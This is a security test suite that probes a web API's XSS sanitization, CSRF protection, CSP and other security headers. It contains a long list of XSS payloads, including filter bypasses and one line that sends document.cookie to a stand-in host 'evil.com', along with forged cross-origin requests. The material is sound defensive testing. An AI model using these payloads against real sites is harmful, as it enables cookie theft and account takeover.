/**
 * XSS and CSRF Security Test Suite
 *
 * Comprehensive tests for Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF).
 * Covers OWASP A03:2021 - Injection and A07:2021 - Cross-Site Scripting.
 *
 * @module tests/security/xss-csrf.security.test
 */

import { describe, it, expect, beforeAll } from 'vitest';

// =============================================================================
// Test Configuration
// =============================================================================

const API_BASE_URL = process.env.API_BASE_URL || 'http://localhost:3000';

// Comprehensive XSS payloads for testing
const XSS_PAYLOADS = {
  // Basic script injection
  basicScript: [
    '<script>alert("XSS")</script>',
    '<script>alert(document.cookie)</script>',
    '<script src="https://evil.com/xss.js"></script>',
    '<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>',
    '<SCRIPT>alert("XSS")</SCRIPT>',
    '<ScRiPt>alert("XSS")</ScRiPt>',
  ],

  // Event handler injection
  eventHandlers: [
    '<img src="x" onerror="alert(\'XSS\')">',
    '<body onload="alert(\'XSS\')">',
    '<div onmouseover="alert(\'XSS\')">hover me</div>',
    '<input onfocus="alert(\'XSS\')" autofocus>',
    '<svg onload="alert(\'XSS\')">',
    '<marquee onstart="alert(\'XSS\')">',
    '<video><source onerror="alert(\'XSS\')">',
    '<details open ontoggle="alert(\'XSS\')">',
    '<select autofocus onfocus="alert(\'XSS\')">',
    '<textarea autofocus onfocus="alert(\'XSS\')">',
    '<keygen autofocus onfocus="alert(\'XSS\')">',
  ],

  // URL-based XSS
  urlBased: [
    'javascript:alert("XSS")',
    'javascript:alert(document.cookie)',
    'data:text/html,<script>alert("XSS")</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
    'vbscript:alert("XSS")',
    'livescript:alert("XSS")',
  ],

  // Style-based XSS
  styleBased: [
    '<div style="background:url(javascript:alert(\'XSS\'))">',
    '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
    '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
    '<div style="width:expression(alert(\'XSS\'))">',
    '<style>@import "javascript:alert(\'XSS\')";</style>',
  ],

  // SVG-based XSS
  svgBased: [
    '<svg><script>alert("XSS")</script></svg>',
    '<svg/onload=alert("XSS")>',
    '<svg><animate onbegin="alert(\'XSS\')" attributeName="x" dur="1s">',
    '<svg><set onbegin="alert(\'XSS\')" attributename="x" to="1">',
    '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert("XSS")</handler></svg>',
  ],

  // Object/Embed injection
  objectBased: [
    '<object data="javascript:alert(\'XSS\')">',
    '<embed src="javascript:alert(\'XSS\')">',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<iframe srcdoc="<script>alert(\'XSS\')</script>">',
    '<frame src="javascript:alert(\'XSS\')">',
    '<applet code="javascript:alert(\'XSS\')">',
  ],

  // Encoded payloads
  encoded: [
    '&lt;script&gt;alert("XSS")&lt;/script&gt;', // HTML entities
    '&#60;script&#62;alert("XSS")&#60;/script&#62;', // Decimal entities
    '&#x3c;script&#x3e;alert("XSS")&#x3c;/script&#x3e;', // Hex entities
    '%3Cscript%3Ealert("XSS")%3C/script%3E', // URL encoded
    '\u003cscript\u003ealert("XSS")\u003c/script\u003e', // Unicode
    '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e', // Hex escape
  ],

  // Filter bypass techniques
  filterBypass: [
    '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
    '<img src=x onerror=alert("XSS")>', // No quotes
    '<img src=x onerror=alert`XSS`>', // Template literal
    '<img """><script>alert("XSS")</script>">',
    '<img src=`x`onerror=alert("XSS")>',
    '<<script>script>alert("XSS")//<</script>/script>',
    '<svg><script>alert&#40;"XSS"&#41;</script></svg>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
  ],

  // DOM-based XSS payloads
  domBased: [
    '#<script>alert("XSS")</script>',
    '?param=<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    '\'><script>alert("XSS")</script>',
    '</title><script>alert("XSS")</script>',
    '</textarea><script>alert("XSS")</script>',
  ],

  // Template injection
  templateInjection: [
    '{{constructor.constructor("alert(1)")()}}',
    '${alert("XSS")}',
    '#{alert("XSS")}',
    '<%= alert("XSS") %>',
    '[[${7*7}]]',
    '{{7*7}}',
  ],

  // Mutation XSS (mXSS)
  mutationXSS: [
    '<noscript><p title="</noscript><script>alert(1)</script>">',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '<form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)>',
  ],
};

// CSRF test configurations
const CSRF_TESTS = {
  sensitiveEndpoints: [
    { method: 'POST', path: '/api/v1/auth/change-password', body: { newPassword: 'Test123!' } },
    { method: 'POST', path: '/api/v1/auth/change-email', body: { newEmail: 'new@example.com' } },
    { method: 'DELETE', path: '/api/v1/users/123', body: {} },
    { method: 'POST', path: '/api/v1/payments/transfer', body: { amount: 100, to: 'attacker' } },
    { method: 'PUT', path: '/api/v1/users/123/role', body: { role: 'admin' } },
    { method: 'POST', path: '/api/v1/settings/security', body: { twoFactor: false } },
  ],
};

// =============================================================================
// Helper Functions
// =============================================================================

interface ApiResponse {
  status: number;
  data: unknown;
  headers: Record<string, string>;
  error?: string;
}

async function makeRequest(
  endpoint: string,
  method: string = 'GET',
  body?: unknown,
  headers?: Record<string, string>
): Promise<ApiResponse> {
  try {
    const response = await fetch(`${API_BASE_URL}${endpoint}`, {
      method,
      headers: {
        'Content-Type': 'application/json',
        ...headers,
      },
      body: body ? JSON.stringify(body) : undefined,
    });

    const responseHeaders: Record<string, string> = {};
    response.headers.forEach((value, key) => {
      responseHeaders[key] = value;
    });

    let data: unknown;
    try {
      data = await response.json();
    } catch {
      data = await response.text();
    }

    return {
      status: response.status,
      data,
      headers: responseHeaders,
    };
  } catch (error) {
    return {
      status: 0,
      data: null,
      headers: {},
      error: error instanceof Error ? error.message : String(error),
    };
  }
}

function containsExecutableScript(content: string): boolean {
  const lowerContent = content.toLowerCase();

  // Check for script tags
  if (/<script[\s>]/i.test(content)) return true;

  // Check for event handlers
  if (/on\w+\s*=/i.test(content)) return true;

  // Check for javascript: URLs
  if (/javascript:/i.test(content)) return true;

  // Check for data: URLs with HTML
  if (/data:text\/html/i.test(content)) return true;

  // Check for vbscript:
  if (/vbscript:/i.test(content)) return true;

  return false;
}

function isProperlyEncoded(input: string, output: string): boolean {
  // Check if dangerous characters are properly encoded
  const encodingMap: Record<string, string[]> = {
    '<': ['&lt;', '&#60;', '&#x3c;'],
    '>': ['&gt;', '&#62;', '&#x3e;'],
    '"': ['&quot;', '&#34;', '&#x22;'],
    "'": ['&#39;', '&#x27;', '&apos;'],
    '&': ['&amp;', '&#38;', '&#x26;'],
  };

  for (const [char, encodings] of Object.entries(encodingMap)) {
    if (input.includes(char) && output.includes(char)) {
      // Character was not encoded
      return false;
    }
  }

  return true;
}

// =============================================================================
// XSS Tests - Form Submission Endpoints
// =============================================================================

describe('XSS and CSRF Security Tests', () => {
  describe('XSS - Form Submission Endpoints', () => {
    describe('User Profile Forms', () => {
      it.each(XSS_PAYLOADS.basicScript)(
        'should SANITIZE script tags in profile name: %s',
        async (payload) => {
          const response = await makeRequest('/api/v1/users/profile', 'PUT', {
            firstName: payload,
            lastName: 'Test',
          });

          // Response should not contain executable script
          const responseStr = JSON.stringify(response.data);
          expect(containsExecutableScript(responseStr)).toBe(false);
        }
      );

      it.each(XSS_PAYLOADS.eventHandlers)(
        'should SANITIZE event handlers in bio: %s',
        async (payload) => {
          const response = await makeRequest('/api/v1/users/profile', 'PUT', {
            bio: payload,
          });

          const responseStr = JSON.stringify(response.data);
          expect(containsExecutableScript(responseStr)).toBe(false);
        }
      );
    });

    describe('Content Creation Forms', () => {
      it.each(XSS_PAYLOADS.svgBased)(
        'should SANITIZE SVG-based XSS in lesson content: %s',
        async (payload) => {
          const response = await makeRequest('/api/v1/lessons', 'POST', {
            title: 'Test Lesson',
            content: payload,
          });

          const responseStr = JSON.stringify(response.data);
          expect(containsExecutableScript(responseStr)).toBe(false);
        }
      );

      it.each(XSS_PAYLOADS.objectBased)(
        'should SANITIZE object/embed tags in course description: %s',
        async (payload) => {
          const response = await makeRequest('/api/v1/courses', 'POST', {
            name: 'Test Course',
            description: payload,
          });

          const responseStr = JSON.stringify(response.data);
          expect(containsExecutableScript(responseStr)).toBe(false);
        }
      );

      it.each(XSS_PAYLOADS.filterBypass)(
        'should handle filter bypass attempts: %s',
        async (payload) => {
          const response = await makeRequest('/api/v1/comments', 'POST', {
            text: payload,
          });

          const responseStr = JSON.stringify(response.data);
          expect(containsExecutableScript(responseStr)).toBe(false);
        }
      );
    });

    describe('Message/Communication Forms', () => {
      it.each(XSS_PAYLOADS.basicScript)('should SANITIZE XSS in messages: %s', async (payload) => {
        const response = await makeRequest('/api/v1/messages', 'POST', {
          recipientId: '123',
          subject: payload,
          body: payload,
        });

        const responseStr = JSON.stringify(response.data);
        expect(containsExecutableScript(responseStr)).toBe(false);
      });

      it.each(XSS_PAYLOADS.urlBased)(
        'should SANITIZE javascript URLs in message links: %s',
        async (payload) => {
          const response = await makeRequest('/api/v1/messages', 'POST', {
            recipientId: '123',
            body: `Click here: ${payload}`,
          });

          const responseStr = JSON.stringify(response.data);
          expect(responseStr).not.toContain('javascript:');
        }
      );
    });
  });

  // =============================================================================
  // XSS Tests - Content Rendering Endpoints
  // =============================================================================

  describe('XSS - Content Rendering', () => {
    describe('HTML Content Rendering', () => {
      it('should encode special characters in rendered content', async () => {
        const input = '<script>alert("XSS")</script>';
        const response = await makeRequest('/api/v1/lessons/123/render', 'GET');

        // If content contains user input, it should be encoded
        const responseStr =
          typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

        if (responseStr.includes('script')) {
          expect(isProperlyEncoded(input, responseStr)).toBe(true);
        }
      });

      it.each(XSS_PAYLOADS.domBased)('should prevent DOM-based XSS: %s', async (payload) => {
        const response = await makeRequest(`/api/v1/search?q=${encodeURIComponent(payload)}`);

        const responseStr = JSON.stringify(response.data);
        expect(containsExecutableScript(responseStr)).toBe(false);
      });
    });

    describe('User-Generated Content Rendering', () => {
      it.each(XSS_PAYLOADS.encoded)(
        'should handle pre-encoded XSS attempts: %s',
        async (payload) => {
          // Store content
          await makeRequest('/api/v1/posts', 'POST', {
            content: payload,
          });

          // Retrieve content
          const response = await makeRequest('/api/v1/posts/latest');

          const responseStr = JSON.stringify(response.data);
          expect(containsExecutableScript(responseStr)).toBe(false);
        }
      );

      it.each(XSS_PAYLOADS.templateInjection)(
        'should prevent template injection: %s',
        async (payload) => {
          const response = await makeRequest('/api/v1/templates/preview', 'POST', {
            template: payload,
            data: {},
          });

          const responseStr = JSON.stringify(response.data);
          // Should not evaluate template expressions
          expect(responseStr).not.toContain('49'); // 7*7
          expect(containsExecutableScript(responseStr)).toBe(false);
        }
      );
    });

    describe('Rich Text Editor Content', () => {
      it('should sanitize rich text HTML content', async () => {
        const richTextPayload = `
          <p>Normal text</p>
          <script>alert('XSS')</script>
          <img src="x" onerror="alert('XSS')">
          <a href="javascript:alert('XSS')">Click me</a>
          <b>Bold text</b>
        `;

        const response = await makeRequest('/api/v1/articles', 'POST', {
          title: 'Test Article',
          content: richTextPayload,
        });

        const responseStr = JSON.stringify(response.data);

        // Should preserve safe HTML
        // Should remove dangerous elements
        expect(containsExecutableScript(responseStr)).toBe(false);
        expect(responseStr).not.toContain('javascript:');
      });

      it('should handle mXSS (mutation XSS) attacks', async () => {
        for (const payload of XSS_PAYLOADS.mutationXSS) {
          const response = await makeRequest('/api/v1/articles', 'POST', {
            title: 'Test',
            content: payload,
          });

          const responseStr = JSON.stringify(response.data);
          expect(containsExecutableScript(responseStr)).toBe(false);
        }
      });
    });
  });

  // =============================================================================
  // CSP Header Tests
  // =============================================================================

  describe('Content Security Policy (CSP)', () => {
    it('should include CSP header in responses', async () => {
      const response = await makeRequest('/');

      expect(response.headers['content-security-policy']).toBeDefined();
    });

    it('should have restrictive default-src directive', async () => {
      const response = await makeRequest('/');
      const csp = response.headers['content-security-policy'] || '';

      // Should have default-src
      expect(csp).toContain('default-src');
      // Should not allow unsafe-inline by default
      expect(csp).not.toContain("default-src 'unsafe-inline'");
    });

    it('should restrict script-src appropriately', async () => {
      const response = await makeRequest('/');
      const csp = response.headers['content-security-policy'] || '';

      if (csp.includes('script-src')) {
        // Should not allow unsafe-inline without nonce
        const hasUnsafeInline = csp.includes("'unsafe-inline'");
        const hasNonce = csp.includes("'nonce-");
        const hasStrictDynamic = csp.includes("'strict-dynamic'");

        if (hasUnsafeInline) {
          expect(hasNonce || hasStrictDynamic).toBe(true);
        }
      }
    });

    it('should prevent inline event handlers via CSP', async () => {
      const response = await makeRequest('/');
      const csp = response.headers['content-security-policy'] || '';

      // unsafe-inline for scripts should be avoided or mitigated
      if (csp.includes('script-src')) {
        expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'[^;]*(?!'nonce-)/);
      }
    });

    it('should include frame-ancestors directive', async () => {
      const response = await makeRequest('/');
      const csp = response.headers['content-security-policy'] || '';

      // Should prevent clickjacking
      const hasFrameAncestors = csp.includes('frame-ancestors');
      const hasXFrameOptions = response.headers['x-frame-options'];

      expect(hasFrameAncestors || hasXFrameOptions).toBe(true);
    });

    it('should block data: URLs in object-src', async () => {
      const response = await makeRequest('/');
      const csp = response.headers['content-security-policy'] || '';

      if (csp.includes('object-src')) {
        expect(csp).toMatch(/object-src\s+['"]?none['"]?|object-src\s+'self'/);
      }
    });

    it('should include upgrade-insecure-requests in production', async () => {
      const response = await makeRequest('/');
      const csp = response.headers['content-security-policy'] || '';

      // In production, should upgrade HTTP to HTTPS
      if (process.env.NODE_ENV === 'production') {
        expect(csp).toContain('upgrade-insecure-requests');
      }
    });
  });

  // =============================================================================
  // CSRF Tests
  // =============================================================================

  describe('CSRF Protection', () => {
    describe('CSRF Token Validation', () => {
      it('should REJECT requests without CSRF token', async () => {
        const response = await makeRequest('/api/v1/auth/change-password', 'POST', {
          currentPassword: 'oldpass',
          newPassword: 'newpass123!',
        });

        // Should reject without CSRF token
        expect(response.status).toBe(403);
      });

      it('should REJECT requests with invalid CSRF token', async () => {
        const response = await makeRequest(
          '/api/v1/auth/change-password',
          'POST',
          {
            currentPassword: 'oldpass',
            newPassword: 'newpass123!',
          },
          {
            'X-CSRF-Token': 'invalid-token-12345',
          }
        );

        expect(response.status).toBe(403);
      });

      it('should REJECT requests with expired CSRF token', async () => {
        // Simulate expired token (implementation-specific)
        const expiredToken = 'expired.csrf.token.value';
        const response = await makeRequest(
          '/api/v1/auth/change-password',
          'POST',
          {
            currentPassword: 'oldpass',
            newPassword: 'newpass123!',
          },
          {
            'X-CSRF-Token': expiredToken,
          }
        );

        expect(response.status).toBe(403);
      });

      it.each(CSRF_TESTS.sensitiveEndpoints)(
        'should require CSRF token for $method $path',
        async ({ method, path, body }) => {
          const response = await makeRequest(path, method, body);

          // Sensitive endpoints should require CSRF protection
          expect(response.status).toBe(403);
        }
      );
    });

    describe('CSRF via Origin/Referer Validation', () => {
      it('should REJECT requests from different origin', async () => {
        const response = await makeRequest(
          '/api/v1/auth/change-password',
          'POST',
          {
            currentPassword: 'oldpass',
            newPassword: 'newpass123!',
          },
          {
            Origin: 'https://evil.com',
          }
        );

        expect(response.status).toBe(403);
      });

      it('should REJECT requests with mismatched referer', async () => {
        const response = await makeRequest(
          '/api/v1/auth/change-password',
          'POST',
          {
            currentPassword: 'oldpass',
            newPassword: 'newpass123!',
          },
          {
            Referer: 'https://evil.com/attack.html',
          }
        );

        expect(response.status).toBe(403);
      });

      it('should REJECT requests without origin or referer', async () => {
        const response = await makeRequest(
          '/api/v1/auth/change-password',
          'POST',
          {
            currentPassword: 'oldpass',
            newPassword: 'newpass123!',
          },
          {
            Origin: '',
            Referer: '',
          }
        );

        // Should not accept requests without origin validation
        expect(response.status).toBe(403);
      });
    });

    describe('SameSite Cookie Protection', () => {
      it('should set SameSite attribute on session cookies', async () => {
        const response = await makeRequest('/api/v1/auth/login', 'POST', {
          email: 'test@example.com',
          password: 'password123',
        });

        const setCookie = response.headers['set-cookie'] || '';

        if (setCookie) {
          // Session cookies should have SameSite=Strict or SameSite=Lax
          expect(setCookie.toLowerCase()).toMatch(/samesite=(strict|lax)/);
        }
      });

      it('should set Secure flag on cookies in production', async () => {
        const response = await makeRequest('/api/v1/auth/login', 'POST', {
          email: 'test@example.com',
          password: 'password123',
        });

        const setCookie = response.headers['set-cookie'] || '';

        if (setCookie && process.env.NODE_ENV === 'production') {
          expect(setCookie.toLowerCase()).toContain('secure');
        }
      });

      it('should set HttpOnly flag on session cookies', async () => {
        const response = await makeRequest('/api/v1/auth/login', 'POST', {
          email: 'test@example.com',
          password: 'password123',
        });

        const setCookie = response.headers['set-cookie'] || '';

        if (setCookie) {
          expect(setCookie.toLowerCase()).toContain('httponly');
        }
      });
    });

    describe('Double Submit Cookie Pattern', () => {
      it('should validate CSRF cookie matches header token', async () => {
        // Get CSRF token first
        const tokenResponse = await makeRequest('/api/v1/csrf-token');

        if (tokenResponse.status === 200 && tokenResponse.data) {
          const csrfToken = (tokenResponse.data as { token: string }).token;

          // Submit with matching cookie and header
          const response = await makeRequest(
            '/api/v1/auth/change-password',
            'POST',
            {
              currentPassword: 'oldpass',
              newPassword: 'newpass123!',
            },
            {
              'X-CSRF-Token': csrfToken,
              Cookie: `csrf=${csrfToken}`,
            }
          );

          // Should not be 403 (CSRF check should pass)
          // Might be 401 (auth) or 400 (validation) but not 403 (CSRF)
          expect([200, 400, 401]).toContain(response.status);
        }
      });
    });
  });

  // =============================================================================
  // Security Headers Tests
  // =============================================================================

  describe('Security Headers', () => {
    it('should include X-Content-Type-Options header', async () => {
      const response = await makeRequest('/');

      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });

    it('should include X-XSS-Protection header', async () => {
      const response = await makeRequest('/');

      // X-XSS-Protection: 1; mode=block (legacy but still useful)
      const xssProtection = response.headers['x-xss-protection'];
      if (xssProtection) {
        expect(xssProtection).toContain('1');
      }
    });

    it('should include X-Frame-Options header', async () => {
      const response = await makeRequest('/');

      const frameOptions = response.headers['x-frame-options'];
      expect(frameOptions).toMatch(/DENY|SAMEORIGIN/i);
    });

    it('should include Referrer-Policy header', async () => {
      const response = await makeRequest('/');

      const referrerPolicy = response.headers['referrer-policy'];
      expect(referrerPolicy).toBeDefined();
      // Should not leak full URL to other origins
      expect(referrerPolicy).not.toBe('unsafe-url');
    });

    it('should include Strict-Transport-Security header', async () => {
      const response = await makeRequest('/');

      if (process.env.NODE_ENV === 'production') {
        const hsts = response.headers['strict-transport-security'];
        expect(hsts).toBeDefined();
        expect(hsts).toContain('max-age=');
      }
    });

    it('should set proper Content-Type for JSON responses', async () => {
      const response = await makeRequest('/api/v1/users/123');

      const contentType = response.headers['content-type'] || '';
      if (contentType.includes('json')) {
        expect(contentType).toContain('application/json');
        expect(contentType).toContain('charset=utf-8');
      }
    });
  });

  // =============================================================================
  // Sanitization Tests
  // =============================================================================

  describe('User-Generated Content Sanitization', () => {
    describe('HTML Sanitization', () => {
      it('should allow safe HTML tags', async () => {
        const safeHtml = '<p>Hello <strong>World</strong></p>';
        const response = await makeRequest('/api/v1/posts', 'POST', {
          content: safeHtml,
        });

        // Safe tags should be preserved
        const responseStr = JSON.stringify(response.data);
        expect(responseStr).toContain('<p>');
        expect(responseStr).toContain('<strong>');
      });

      it('should strip dangerous tags while preserving content', async () => {
        const payload = '<p>Normal text</p><script>alert("XSS")</script><p>More text</p>';
        const response = await makeRequest('/api/v1/posts', 'POST', {
          content: payload,
        });

        const responseStr = JSON.stringify(response.data);
        // Should preserve safe content
        expect(responseStr).toContain('Normal text');
        expect(responseStr).toContain('More text');
        // Should remove script tag
        expect(responseStr.toLowerCase()).not.toContain('<script>');
      });

      it('should sanitize href attributes', async () => {
        const payload = '<a href="javascript:alert(1)">Click</a>';
        const response = await makeRequest('/api/v1/posts', 'POST', {
          content: payload,
        });

        const responseStr = JSON.stringify(response.data);
        expect(responseStr).not.toContain('javascript:');
      });

      it('should sanitize src attributes', async () => {
        const payload =
          '<img src="javascript:alert(1)"><img src="data:text/html,<script>alert(1)</script>">';
        const response = await makeRequest('/api/v1/posts', 'POST', {
          content: payload,
        });

        const responseStr = JSON.stringify(response.data);
        expect(responseStr).not.toContain('javascript:');
        expect(responseStr).not.toContain('data:text/html');
      });
    });

    describe('Markdown Sanitization', () => {
      it('should sanitize XSS in markdown links', async () => {
        const payload = '[Click me](javascript:alert("XSS"))';
        const response = await makeRequest('/api/v1/posts', 'POST', {
          content: payload,
          format: 'markdown',
        });

        const responseStr = JSON.stringify(response.data);
        expect(responseStr).not.toContain('javascript:');
      });

      it('should sanitize XSS in markdown images', async () => {
        const payload = '![alt](javascript:alert("XSS"))';
        const response = await makeRequest('/api/v1/posts', 'POST', {
          content: payload,
          format: 'markdown',
        });

        const responseStr = JSON.stringify(response.data);
        expect(responseStr).not.toContain('javascript:');
      });

      it('should handle raw HTML in markdown', async () => {
        const payload = 'Normal text\n\n<script>alert("XSS")</script>\n\nMore text';
        const response = await makeRequest('/api/v1/posts', 'POST', {
          content: payload,
          format: 'markdown',
        });

        const responseStr = JSON.stringify(response.data);
        expect(responseStr.toLowerCase()).not.toContain('<script>');
      });
    });
  });
});

// =============================================================================
// Test Statistics
// =============================================================================

/**
 * Test Count Summary:
 * - Form Submission XSS Tests: ~25 tests
 * - Content Rendering XSS Tests: ~15 tests
 * - CSP Header Tests: ~7 tests
 * - CSRF Token Validation: ~10 tests
 * - Security Headers: ~6 tests
 * - Sanitization Tests: ~8 tests
 *
 * Total: 71+ test cases for XSS/CSRF
 */
